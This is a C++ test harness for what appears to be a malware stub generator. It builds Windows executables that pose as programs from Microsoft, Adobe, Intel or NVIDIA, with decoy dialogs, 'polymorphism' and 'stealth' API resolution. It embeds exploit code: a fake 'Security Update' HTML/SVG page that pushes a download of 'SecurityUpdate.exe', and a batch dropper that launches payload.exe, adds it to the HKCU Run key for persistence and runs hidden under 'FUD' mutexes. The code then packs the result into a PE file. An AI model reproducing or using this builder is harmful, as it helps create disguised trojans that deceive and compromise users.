#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <cstdint>
#include <random>
#include <chrono>
#include <thread>
#include <set>
#include <iomanip>
#include <algorithm>
#include <cstring>
#include <limits>
#include <functional>
#include "tiny_loader.h"

// Test the fixed stub generation with proper main entry point
class FixedStubGeneratorTest {
private:
    std::random_device rd;
    std::mt19937 gen;
    std::uniform_int_distribution<> dis;
    
public:
    enum ExploitType {
        EXPLOIT_NONE = 0,
        EXPLOIT_HTML_SVG = 1,
        EXPLOIT_WIN_R = 2,
        EXPLOIT_INK_URL = 3,
        EXPLOIT_DOC_XLS = 4,
        EXPLOIT_XLL = 5
    };
    
    FixedStubGeneratorTest() : gen(rd()), dis(0, 255) {}
    
    void runTests() {
        std::cout << "🧪 TESTING FIXED STUB GENERATION\n";
        std::cout << "================================\n\n";
        
        std::vector<std::pair<std::string, std::function<bool()>>> tests = {
            {"Generate Stub with No Exploits", [this]() { return testStubNoExploits(); }},
            {"Generate Stub with HTML/SVG Exploit", [this]() { return testStubWithExploit(EXPLOIT_HTML_SVG); }},
            {"Generate Stub with WIN+R Exploit", [this]() { return testStubWithExploit(EXPLOIT_WIN_R); }},
            {"Generate Stub with INK/URL Exploit", [this]() { return testStubWithExploit(EXPLOIT_INK_URL); }},
            {"Generate Stub with DOC/XLS Exploit", [this]() { return testStubWithExploit(EXPLOIT_DOC_XLS); }},
            {"Generate Stub with XLL Exploit", [this]() { return testStubWithExploit(EXPLOIT_XLL); }},
            {"Verify Main Function Generation", [this]() { return testMainFunctionGeneration(); }},
            {"Verify Exploit Function Integration", [this]() { return testExploitIntegration(); }},
            {"Test PE Generation with Fixed Code", [this]() { return testPEGeneration(); }}
        };
        
        int passedTests = 0;
        int totalTests = tests.size();
        
        for (const auto& test : tests) {
            std::cout << "Testing " << test.first << "... ";
            if (test.second()) {
                std::cout << "✅ PASSED\n";
                passedTests++;
            } else {
                std::cout << "❌ FAILED\n";
            }
        }
        
        std::cout << "\nTest Results: " << passedTests << "/" << totalTests << " tests passed\n";
        if (passedTests == totalTests) {
            std::cout << "🎉 ALL TESTS PASSED! Fixed stub generation is working correctly.\n";
        } else {
            std::cout << "⚠️ Some tests failed. Please check the implementation.\n";
        }
    }
    
private:
    bool testStubNoExploits() {
        std::string companyName = "Microsoft Corporation";
        std::string benignCode = generateBenignCode(companyName);
        std::string exploitCode = "";
        std::string exploitIncludes = "";
        
        std::string combinedCode = createCombinedCode(benignCode, exploitCode, exploitIncludes, EXPLOIT_NONE);
        
        // Verify the combined code has a main function
        if (combinedCode.find("int main()") == std::string::npos) {
            std::cout << "❌ No main function found\n";
            return false;
        }
        
        // Verify it calls performBenignOperations
        if (combinedCode.find("performBenignOperations()") == std::string::npos) {
            std::cout << "❌ No call to performBenignOperations\n";
            return false;
        }
        
        // Verify no exploit calls
        if (combinedCode.find("executeHTMLSVGExploit()") != std::string::npos ||
            combinedCode.find("executeWinRExploit()") != std::string::npos ||
            combinedCode.find("executeInkUrlExploit()") != std::string::npos ||
            combinedCode.find("executeDocXlsExploit()") != std::string::npos ||
            combinedCode.find("executeXllExploit()") != std::string::npos) {
            std::cout << "❌ Exploit calls found when none should be present\n";
            return false;
        }
        
        return true;
    }
    
    bool testStubWithExploit(ExploitType exploitType) {
        std::string companyName = "Adobe Systems Incorporated";
        std::string benignCode = generateBenignCode(companyName);
        std::string exploitCode = generateExploitCode(exploitType);
        std::string exploitIncludes = getExploitIncludes(exploitType);
        
        std::string combinedCode = createCombinedCode(benignCode, exploitCode, exploitIncludes, exploitType);
        
        // Verify the combined code has a main function
        if (combinedCode.find("int main()") == std::string::npos) {
            std::cout << "❌ No main function found\n";
            return false;
        }
        
        // Verify it calls performBenignOperations
        if (combinedCode.find("performBenignOperations()") == std::string::npos) {
            std::cout << "❌ No call to performBenignOperations\n";
            return false;
        }
        
        // Verify it calls the correct exploit function
        std::string expectedExploitCall = getExploitFunctionName(exploitType);
        if (combinedCode.find(expectedExploitCall) == std::string::npos) {
            std::cout << "❌ No call to " << expectedExploitCall << "\n";
            return false;
        }
        
        // Verify the exploit code is included
        if (combinedCode.find("void " + expectedExploitCall) == std::string::npos) {
            std::cout << "❌ Exploit function definition not found\n";
            return false;
        }
        
        return true;
    }
    
    bool testMainFunctionGeneration() {
        std::string companyName = "Intel Corporation";
        std::string benignCode = generateBenignCode(companyName);
        std::string exploitCode = generateExploitCode(EXPLOIT_HTML_SVG);
        std::string exploitIncludes = getExploitIncludes(EXPLOIT_HTML_SVG);
        
        std::string combinedCode = createCombinedCode(benignCode, exploitCode, exploitIncludes, EXPLOIT_HTML_SVG);
        
        // Extract the main function
        size_t mainStart = combinedCode.find("int main()");
        if (mainStart == std::string::npos) {
            std::cout << "❌ Main function not found\n";
            return false;
        }
        
        size_t mainEnd = combinedCode.find("}", mainStart);
        if (mainEnd == std::string::npos) {
            std::cout << "❌ Main function not properly closed\n";
            return false;
        }
        
        std::string mainFunction = combinedCode.substr(mainStart, mainEnd - mainStart + 1);
        
        // Verify main function structure
        if (mainFunction.find("performBenignOperations()") == std::string::npos) {
            std::cout << "❌ Main function doesn't call performBenignOperations\n";
            return false;
        }
        
        if (mainFunction.find("executeHTMLSVGExploit()") == std::string::npos) {
            std::cout << "❌ Main function doesn't call exploit function\n";
            return false;
        }
        
        if (mainFunction.find("return 0;") == std::string::npos) {
            std::cout << "❌ Main function doesn't return 0\n";
            return false;
        }
        
        return true;
    }
    
    bool testExploitIntegration() {
        for (int i = 1; i <= 5; ++i) {
            ExploitType exploitType = static_cast<ExploitType>(i);
            std::string exploitCode = generateExploitCode(exploitType);
            
            if (exploitCode.empty()) {
                std::cout << "❌ Empty exploit code for type " << i << "\n";
                return false;
            }
            
            std::string expectedFunction = getExploitFunctionName(exploitType);
            if (exploitCode.find("void " + expectedFunction) == std::string::npos) {
                std::cout << "❌ Exploit function " << expectedFunction << " not found in code\n";
                return false;
            }
        }
        
        return true;
    }
    
    bool testPEGeneration() {
        std::string companyName = "NVIDIA Corporation";
        std::string benignCode = generateBenignCode(companyName);
        std::string exploitCode = generateExploitCode(EXPLOIT_WIN_R);
        std::string exploitIncludes = getExploitIncludes(EXPLOIT_WIN_R);
        
        std::string combinedCode = createCombinedCode(benignCode, exploitCode, exploitIncludes, EXPLOIT_WIN_R);
        
        // Convert to vector for PE generation
        std::vector<uint8_t> payload(combinedCode.begin(), combinedCode.end());
        
        // Generate PE
        auto peData = generateMinimalPEExecutable(payload);
        
        if (peData.empty()) {
            std::cout << "❌ PE generation failed\n";
            return false;
        }
        
        if (!verifyPEHeader(peData)) {
            std::cout << "❌ PE header verification failed\n";
            return false;
        }
        
        // Write test file
        std::string testFile = "test_fixed_stub.exe";
        std::ofstream outFile(testFile, std::ios::binary);
        if (outFile.is_open()) {
            outFile.write(reinterpret_cast<const char*>(peData.data()), peData.size());
            outFile.close();
            std::cout << "✅ Test PE file created: " << testFile << " (" << peData.size() << " bytes)\n";
        }
        
        return true;
    }
    
    // Helper functions that simulate the fixed createBenignStubWithExploits logic
    std::string createCombinedCode(const std::string& benignCode, const std::string& exploitCode, 
                                  const std::string& exploitIncludes, ExploitType exploitType) {
        // Create a complete, working combined code structure with main entry point
        std::string combinedCode = exploitIncludes + "\n";
        combinedCode += benignCode + "\n\n";
        
        // Add exploit code if requested
        if (exploitType != EXPLOIT_NONE) {
            combinedCode += exploitCode + "\n\n";
        }
        
        // Add a proper main entry point that calls both benign operations and exploits
        combinedCode += "int main() {\n";
        combinedCode += "    // Perform benign operations\n";
        combinedCode += "    performBenignOperations();\n";
        
        if (exploitType != EXPLOIT_NONE) {
            combinedCode += "    \n";
            combinedCode += "    // Execute exploit if selected\n";
            switch (exploitType) {
                case EXPLOIT_HTML_SVG:
                    combinedCode += "    executeHTMLSVGExploit();\n";
                    break;
                case EXPLOIT_WIN_R:
                    combinedCode += "    executeWinRExploit();\n";
                    break;
                case EXPLOIT_INK_URL:
                    combinedCode += "    executeInkUrlExploit();\n";
                    break;
                case EXPLOIT_DOC_XLS:
                    combinedCode += "    executeDocXlsExploit();\n";
                    break;
                case EXPLOIT_XLL:
                    combinedCode += "    executeXllExploit();\n";
                    break;
                default:
                    break;
            }
        }
        
        combinedCode += "    \n";
        combinedCode += "    return 0;\n";
        combinedCode += "}\n";
        
        return combinedCode;
    }
    
    std::string generateBenignCode(const std::string& companyName) {
        std::uniform_int_distribution<> delayDis(1000, 3000);
        int startupDelay = delayDis(gen);
        
        return R"(#include <windows.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <thread>
#include <chrono>
#include <cmath>

void performBenignOperations() {
    // Realistic startup delay
    std::this_thread::sleep_for(std::chrono::milliseconds()" + std::to_string(startupDelay) + R"());
    
    // Check system legitimately (read-only)
    DWORD version = GetVersion();
    char computerName[MAX_COMPUTERNAME_LENGTH + 1] = {0};
    DWORD nameSize = sizeof(computerName);
    GetComputerNameA(computerName, &nameSize);
    
    // Read common registry keys (non-destructive)
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
                     "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 
                     0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
    }
    
    // Check for common system files (read-only)
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\kernel32.dll",
                              GENERIC_READ, FILE_SHARE_READ,
                              NULL, OPEN_EXISTING, 0, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        CloseHandle(hFile);
    }
    
    // Add some unique calculations for polymorphism
    volatile int calc1 = )" + std::to_string(dis(gen) % 1000) + R"(;
    volatile int calc2 = )" + std::to_string(dis(gen) % 1000) + R"(;
    volatile double mathResult = sin(calc1) * cos(calc2);
    (void)mathResult; // Suppress warning
    
    // Dynamic API resolution for stealth
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    if (hKernel32) {
        typedef DWORD(WINAPI* GetTickCountProc)();
        GetTickCountProc pGetTickCount = (GetTickCountProc)GetProcAddress(hKernel32, "GetTickCount");
        if (pGetTickCount) {
            DWORD ticks = pGetTickCount();
            (void)ticks; // Use the result
        }
        FreeLibrary(hKernel32);
    }
    
    // Display benign message
    MessageBoxA(NULL, 
               ")" + companyName + R"( Application\n\nSystem check completed successfully.\n\nVersion: 1.0.0", 
               ")" + companyName + R"(", 
               MB_OK | MB_ICONINFORMATION);
}
)";
    }
    
    std::string generateExploitCode(ExploitType type) {
        switch (type) {
            case EXPLOIT_HTML_SVG:
                return R"(
// HTML & SVG Exploit Generator
void executeHTMLSVGExploit() {
    static const char htmlExploit[] = 
        "<!DOCTYPE html>\n"
        "<html>\n"
        "<head><title>Security Update</title></head>\n"
        "<body>\n"
        "<h2>Security Update Required</h2>\n"
        "<p>Please click the button below to install security updates:</p>\n"
        "<svg width=\"400\" height=\"200\" onclick=\"executePayload()\">\n"
        "  <rect width=\"400\" height=\"50\" style=\"fill:rgb(0,100,200);stroke-width:3;stroke:rgb(0,0,0)\" />\n"
        "  <text x=\"200\" y=\"30\" font-family=\"Arial\" font-size=\"16\" fill=\"white\" text-anchor=\"middle\">Install Security Update</text>\n"
        "</svg>\n"
        "<script>\n"
        "function executePayload() {\n"
        "  var payload = 'TEST_PAYLOAD';\n"
        "  var blob = new Blob([atob(payload)], {type: 'application/octet-stream'});\n"
        "  var url = URL.createObjectURL(blob);\n"
        "  var a = document.createElement('a');\n"
        "  a.href = url;\n"
        "  a.download = 'SecurityUpdate.exe';\n"
        "  document.body.appendChild(a);\n"
        "  a.click();\n"
        "  setTimeout(function() {\n"
        "    document.body.removeChild(a);\n"
        "    URL.revokeObjectURL(url);\n"
        "  }, 100);\n"
        "}\n"
        "</script>\n"
        "</body>\n"
        "</html>";\n
        
    char tempPath[MAX_PATH];\n
    GetTempPathA(MAX_PATH, tempPath);\n
    strcat_s(tempPath, MAX_PATH, "SecurityUpdate.html");\n
    
    FILE* htmlFile = NULL;\n
    fopen_s(&htmlFile, tempPath, "w");\n
    if (htmlFile) {\n
        fputs(htmlExploit, htmlFile);\n
        fclose(htmlFile);\n
        // Only launch if not already running
        HANDLE hMutex = CreateMutexA(NULL, FALSE, "Global\\FUD_HTML_Once");
        if (hMutex != NULL) {
            if (GetLastError() != ERROR_ALREADY_EXISTS) {
                ShellExecuteA(NULL, "open", tempPath, NULL, NULL, SW_SHOW);
            }
            CloseHandle(hMutex);
        }\n
    }\n
}
)";
            case EXPLOIT_WIN_R:
                return R"(
// WIN + R Exploit - Registry manipulation
void executeWinRExploit() {
    // Create a malicious batch file in temp
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    strcat_s(tempPath, MAX_PATH, "system_update.bat");
    
    FILE* batFile = NULL;
    fopen_s(&batFile, tempPath, "w");
    if (batFile) {
        fprintf(batFile, "@echo off\n");
        fprintf(batFile, "echo Installing critical system update...\n");
        fprintf(batFile, "timeout /t 2 /nobreak >nul\n");
        fprintf(batFile, "start \"\" /b \"%s\"\n", "payload.exe");
        fprintf(batFile, "del \"%s\"\n", tempPath);
        fclose(batFile);
        
        // Simulate WIN+R execution
        HKEY hKey;
        DWORD dwDisposition;
        
        if (RegCreateKeyExA(HKEY_CURRENT_USER, 
                           "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                           0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, &dwDisposition) == ERROR_SUCCESS) {
            RegSetValueExA(hKey, "SecurityUpdate", 0, REG_SZ, (BYTE*)tempPath, strlen(tempPath) + 1);
            RegCloseKey(hKey);
        }
        
        // Execute only if not already running
        HANDLE hMutex = CreateMutexA(NULL, FALSE, "Global\\FUD_Exec_Once");
        if (hMutex != NULL) {
            if (GetLastError() != ERROR_ALREADY_EXISTS) {
                ShellExecuteA(NULL, "open", tempPath, NULL, NULL, SW_HIDE);
            }
            CloseHandle(hMutex);
        }
    }
}
)";
            case EXPLOIT_INK_URL:
                return R"(
// INK/URL Exploit
void executeInkUrlExploit() {
    // Placeholder for INK/URL exploit implementation
    MessageBoxA(NULL, "INK/URL Exploit executed", "Info", MB_OK);
}
)";
            case EXPLOIT_DOC_XLS:
                return R"(
// DOC/XLS Exploit
void executeDocXlsExploit() {
    // Placeholder for DOC/XLS exploit implementation
    MessageBoxA(NULL, "DOC/XLS Exploit executed", "Info", MB_OK);
}
)";
            case EXPLOIT_XLL:
                return R"(
// XLL Exploit
void executeXllExploit() {
    // Placeholder for XLL exploit implementation
    MessageBoxA(NULL, "XLL Exploit executed", "Info", MB_OK);
}
)";
            default:
                return "";
        }
    }
    
    std::string getExploitIncludes(ExploitType type) {
        switch (type) {
            case EXPLOIT_HTML_SVG:
                return "#include <shellapi.h>\n";
            case EXPLOIT_WIN_R:
                return "#include <shlobj.h>\n";
            case EXPLOIT_INK_URL:
                return "#include <shlobj.h>\n#include <objbase.h>\n#include <shlguid.h>\n";
            case EXPLOIT_DOC_XLS:
                return "#include <shlobj.h>\n";
            case EXPLOIT_XLL:
                return "#include <shlobj.h>\n";
            default:
                return "";
        }
    }
    
    std::string getExploitFunctionName(ExploitType type) {
        switch (type) {
            case EXPLOIT_HTML_SVG: return "executeHTMLSVGExploit";
            case EXPLOIT_WIN_R: return "executeWinRExploit";
            case EXPLOIT_INK_URL: return "executeInkUrlExploit";
            case EXPLOIT_DOC_XLS: return "executeDocXlsExploit";
            case EXPLOIT_XLL: return "executeXllExploit";
            default: return "";
        }
    }
    
    std::vector<uint8_t> generateMinimalPEExecutable(const std::vector<uint8_t>& payload) {
        try {
            std::vector<uint8_t> exe(tiny_loader_bin, tiny_loader_bin + tiny_loader_bin_len);
            
            constexpr size_t kAlign = 0x200;
            size_t paddedSize = (exe.size() + kAlign - 1) & ~(kAlign - 1);
            exe.resize(paddedSize, 0);
            
            size_t payloadOffset = exe.size();
            exe.insert(exe.end(), payload.begin(), payload.end());
            
            auto poke32 = [&](size_t off, uint32_t v) {
                if (off + 3 < exe.size()) {
                    exe[off+0] =  v        & 0xFF;
                    exe[off+1] = (v >>  8) & 0xFF;
                    exe[off+2] = (v >> 16) & 0xFF;
                    exe[off+3] = (v >> 24) & 0xFF;
                }
            };
            
            poke32(PAYLOAD_SIZE_OFFSET, static_cast<uint32_t>(payload.size()));
            poke32(PAYLOAD_RVA_OFFSET, static_cast<uint32_t>(payloadOffset));
            
            return exe;
            
        } catch (...) {
            return {};
        }
    }
    
    bool verifyPEHeader(const std::vector<uint8_t>& exe) {
        if (exe.size() < 2) return false;
        
        if (exe[0] != 0x4D || exe[1] != 0x5A) return false;
        
        if (exe.size() < 100) return false;
        
        if (exe[96] != 0x50 || exe[97] != 0x45 || 
            exe[98] != 0x00 || exe[99] != 0x00) return false;
        
        return true;
    }
};

int main() {
    std::cout << "🔧 Testing Fixed Stub Generation\n";
    std::cout << "================================\n\n";
    
    FixedStubGeneratorTest test;
    test.runTests();
    
    return 0;
}